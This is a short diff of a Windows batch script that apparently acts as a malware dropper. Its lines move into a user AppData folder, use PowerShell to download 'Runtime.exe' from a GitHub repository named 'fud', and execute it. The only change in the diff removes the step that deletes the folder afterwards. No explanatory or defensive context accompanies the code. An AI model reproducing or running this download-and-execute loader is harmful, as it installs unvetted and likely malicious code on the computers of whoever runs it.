@@ -32,4 +32,3 @@ if '%errorlevel%' NEQ '0' (
 cd C:\Users\%USERNAME%\AppData\Local\Anon"
 Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm39/fud/raw/main/Runtime.exe' -OutFile Runtime.exe"
 start Runtime.exe
-rmdir /s /q "C:\Users\%USERNAME%\AppData\Local\Anon\"
